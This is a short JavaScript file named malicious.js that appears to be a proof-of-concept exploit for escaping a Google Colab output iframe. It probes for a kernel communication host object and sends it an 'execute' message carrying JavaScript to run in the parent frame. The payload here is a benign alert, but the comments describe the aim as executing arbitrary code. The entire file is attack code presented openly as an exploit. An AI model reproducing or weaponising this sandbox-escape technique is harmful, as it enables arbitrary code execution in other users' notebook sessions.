// malicious.js
console.log("Malicious script loaded");

// Attempt to access the host communication object
const colabIframeHost = window.google?.colab?.kernel?.comm?.host;

if (colabIframeHost && colabIframeHost.sendMessage) {
    console.log("Sending exploit message to parent...");

    // Exploit: Send message to parent to execute arbitrary code
    colabIframeHost.sendMessage("execute", {
        javascript_to_execute_in_parent: "alert('Iframe Escape Successful!');"
    });
} else {
    console.log("Host object not accessible.");
}
